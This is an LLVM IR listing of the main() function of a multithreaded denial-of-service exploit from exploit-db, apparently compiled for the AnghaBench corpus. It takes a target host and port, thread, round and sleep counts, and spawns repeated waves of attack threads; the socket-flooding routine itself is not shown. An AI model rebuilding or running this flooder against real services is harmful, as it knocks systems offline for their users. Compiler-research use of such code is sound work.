; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/multiple/dos/extr_1671.c_main.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/multiple/dos/extr_1671.c_main.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

%struct.TYPE_2__ = type { i8*, i8*, i8* }

@.str = private unnamed_addr constant [19 x i8] c"[!] Target: %s:%s\0A\00", align 1
@.str.1 = private unnamed_addr constant [32 x i8] c"[!] Threads: %d for each round\0A\00", align 1
@thread_data_array = common dso_local global %struct.TYPE_2__* null, align 8
@sockz = common dso_local global i32 0, align 4
@.str.2 = private unnamed_addr constant [27 x i8] c"main: Can`t create thread\0A\00", align 1
@.str.3 = private unnamed_addr constant [39 x i8] c"[*] Countdown: %d | [!] Sleeping: %ds\0A\00", align 1
@.str.4 = private unnamed_addr constant [7 x i8] c"Done!\0A\00", align 1

; Function Attrs: noinline nounwind optnone uwtable
define dso_local i32 @main(i32 %0, i8** %1) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca i8**, align 8
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  %9 = alloca i32, align 4
  %10 = alloca i8*, align 8
  %11 = alloca i8*, align 8
  %12 = alloca i8*, align 8
  %13 = alloca i8*, align 8
  %14 = alloca i32, align 4
  %15 = alloca i32, align 4
  %16 = alloca i32, align 4
  %17 = alloca i32, align 4
  %18 = alloca i8*, align 8
  %19 = alloca i64, align 8
  store i32 0, i32* %3, align 4
  store i32 %0, i32* %4, align 4
  store i8** %1, i8*** %5, align 8
  %20 = load i32, i32* %4, align 4
  %21 = icmp slt i32 %20, 6
  br i1 %21, label %22, label %27

22:                                               ; preds = %2
  %23 = load i8**, i8*** %5, align 8
  %24 = getelementptr inbounds i8*, i8** %23, i64 0
  %25 = load i8*, i8** %24, align 8
  %26 = call i32 @usage(i8* %25)
  br label %27

27:                                               ; preds = %22, %2
  %28 = load i8**, i8*** %5, align 8
  %29 = getelementptr inbounds i8*, i8** %28, i64 1
  %30 = load i8*, i8** %29, align 8
  store i8* %30, i8** %10, align 8
  %31 = load i8**, i8*** %5, align 8
  %32 = getelementptr inbounds i8*, i8** %31, i64 2
  %33 = load i8*, i8** %32, align 8
  store i8* %33, i8** %11, align 8
  %34 = load i8**, i8*** %5, align 8
  %35 = getelementptr inbounds i8*, i8** %34, i64 3
  %36 = load i8*, i8** %35, align 8
  %37 = call i32 @atoi(i8* %36)
  store i32 %37, i32* %14, align 4
  %38 = load i8**, i8*** %5, align 8
  %39 = getelementptr inbounds i8*, i8** %38, i64 4
  %40 = load i8*, i8** %39, align 8
  %41 = call i32 @atoi(i8* %40)
  store i32 %41, i32* %15, align 4
  %42 = load i32, i32* %15, align 4
  store i32 %42, i32* %17, align 4
  %43 = load i8**, i8*** %5, align 8
  %44 = getelementptr inbounds i8*, i8** %43, i64 5
  %45 = load i8*, i8** %44, align 8
  store i8* %45, i8** %13, align 8
  %46 = load i8*, i8** %13, align 8
  %47 = call i32 @atoi(i8* %46)
  store i32 %47, i32* %16, align 4
  %48 = load i32, i32* %15, align 4
  %49 = icmp slt i32 %48, 40
  br i1 %49, label %50, label %55

50:                                               ; preds = %27
  %51 = load i8**, i8*** %5, align 8
  %52 = getelementptr inbounds i8*, i8** %51, i64 0
  %53 = load i8*, i8** %52, align 8
  %54 = call i32 @usage(i8* %53)
  br label %55

55:                                               ; preds = %50, %27
  %56 = load i8*, i8** %10, align 8
  %57 = call i8* @resolver(i8* %56)
  store i8* %57, i8** %12, align 8
  %58 = load i32, i32* %15, align 4
  %59 = zext i32 %58 to i64
  %60 = call i8* @llvm.stacksave()
  store i8* %60, i8** %18, align 8
  %61 = alloca i32, i64 %59, align 16
  store i64 %59, i64* %19, align 8
  %62 = call i32 (...) @header()
  %63 = load i8*, i8** %12, align 8
  %64 = load i8*, i8** %11, align 8
  %65 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([19 x i8], [19 x i8]* @.str, i64 0, i64 0), i8* %63, i8* %64)
  %66 = load i32, i32* %14, align 4
  %67 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([32 x i8], [32 x i8]* @.str.1, i64 0, i64 0), i32 %66)
  store i32 0, i32* %8, align 4
  br label %68

68:                                               ; preds = %134, %55
  %69 = load i32, i32* %8, align 4
  %70 = load i32, i32* %15, align 4
  %71 = icmp slt i32 %69, %70
  br i1 %71, label %72, label %137

72:                                               ; preds = %68
  store i32 0, i32* %6, align 4
  br label %73

73:                                               ; preds = %124, %72
  %74 = load i32, i32* %6, align 4
  %75 = load i32, i32* %14, align 4
  %76 = icmp slt i32 %74, %75
  br i1 %76, label %77, label %127

77:                                               ; preds = %73
  %78 = load i8*, i8** %12, align 8
  %79 = load %struct.TYPE_2__*, %struct.TYPE_2__** @thread_data_array, align 8
  %80 = load i32, i32* %6, align 4
  %81 = sext i32 %80 to i64
  %82 = getelementptr inbounds %struct.TYPE_2__, %struct.TYPE_2__* %79, i64 %81
  %83 = getelementptr inbounds %struct.TYPE_2__, %struct.TYPE_2__* %82, i32 0, i32 0
  store i8* %78, i8** %83, align 8
  %84 = load i8*, i8** %11, align 8
  %85 = load %struct.TYPE_2__*, %struct.TYPE_2__** @thread_data_array, align 8
  %86 = load i32, i32* %6, align 4
  %87 = sext i32 %86 to i64
  %88 = getelementptr inbounds %struct.TYPE_2__, %struct.TYPE_2__* %85, i64 %87
  %89 = getelementptr inbounds %struct.TYPE_2__, %struct.TYPE_2__* %88, i32 0, i32 1
  store i8* %84, i8** %89, align 8
  %90 = load i8*, i8** %13, align 8
  %91 = load %struct.TYPE_2__*, %struct.TYPE_2__** @thread_data_array, align 8
  %92 = load i32, i32* %6, align 4
  %93 = sext i32 %92 to i64
  %94 = getelementptr inbounds %struct.TYPE_2__, %struct.TYPE_2__* %91, i64 %93
  %95 = getelementptr inbounds %struct.TYPE_2__, %struct.TYPE_2__* %94, i32 0, i32 2
  store i8* %90, i8** %95, align 8
  %96 = load i32, i32* %6, align 4
  %97 = sext i32 %96 to i64
  %98 = getelementptr inbounds i32, i32* %61, i64 %97
  %99 = load %struct.TYPE_2__*, %struct.TYPE_2__** @thread_data_array, align 8
  %100 = load i32, i32* %6, align 4
  %101 = sext i32 %100 to i64
  %102 = getelementptr inbounds %struct.TYPE_2__, %struct.TYPE_2__* %99, i64 %101
  %103 = bitcast %struct.TYPE_2__* %102 to i8*
  %104 = call i32 @pthread_create(i32* %98, i32* null, i8* bitcast (i32* @sockz to i8*), i8* %103)
  store i32 %104, i32* %9, align 4
  %105 = icmp eq i32 %104, -1
  br i1 %105, label %106, label %109

106:                                              ; preds = %77
  %107 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([27 x i8], [27 x i8]* @.str.2, i64 0, i64 0))
  %108 = call i32 @exit(i32 -1) #4
  unreachable

109:                                              ; preds = %77
  store i32 0, i32* %7, align 4
  br label %110

110:                                              ; preds = %120, %109
  %111 = load i32, i32* %7, align 4
  %112 = load i32, i32* %14, align 4
  %113 = icmp slt i32 %111, %112
  br i1 %113, label %114, label %123

114:                                              ; preds = %110
  %115 = load i32, i32* %7, align 4
  %116 = sext i32 %115 to i64
  %117 = getelementptr inbounds i32, i32* %61, i64 %116
  %118 = load i32, i32* %117, align 4
  %119 = call i32 @pthread_join(i32 %118, i32* null)
  br label %120

120:                                              ; preds = %114
  %121 = load i32, i32* %7, align 4
  %122 = add nsw i32 %121, 1
  store i32 %122, i32* %7, align 4
  br label %110

123:                                              ; preds = %110
  br label %124

124:                                              ; preds = %123
  %125 = load i32, i32* %6, align 4
  %126 = add nsw i32 %125, 1
  store i32 %126, i32* %6, align 4
  br label %73

127:                                              ; preds = %73
  %128 = load i32, i32* %17, align 4
  %129 = add nsw i32 %128, -1
  store i32 %129, i32* %17, align 4
  %130 = load i32, i32* %16, align 4
  %131 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([39 x i8], [39 x i8]* @.str.3, i64 0, i64 0), i32 %128, i32 %130)
  %132 = load i32, i32* %16, align 4
  %133 = call i32 @sleep(i32 %132)
  br label %134

134:                                              ; preds = %127
  %135 = load i32, i32* %8, align 4
  %136 = add nsw i32 %135, 1
  store i32 %136, i32* %8, align 4
  br label %68

137:                                              ; preds = %68
  %138 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.4, i64 0, i64 0))
  store i32 0, i32* %3, align 4
  %139 = load i8*, i8** %18, align 8
  call void @llvm.stackrestore(i8* %139)
  %140 = load i32, i32* %3, align 4
  ret i32 %140
}

declare dso_local i32 @usage(i8*) #1

declare dso_local i32 @atoi(i8*) #1

declare dso_local i8* @resolver(i8*) #1

; Function Attrs: nounwind
declare i8* @llvm.stacksave() #2

declare dso_local i32 @header(...) #1

declare dso_local i32 @printf(i8*, ...) #1

declare !callback !2 dso_local i32 @pthread_create(i32*, i32*, i8*, i8*) #1

; Function Attrs: noreturn
declare dso_local i32 @exit(i32) #3

declare dso_local i32 @pthread_join(i32, i32*) #1

declare dso_local i32 @sleep(i32) #1

; Function Attrs: nounwind
declare void @llvm.stackrestore(i8*) #2

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #2 = { nounwind }
attributes #3 = { noreturn "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #4 = { noreturn }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
!2 = !{!3}
!3 = !{i64 2, i64 3, i1 false}
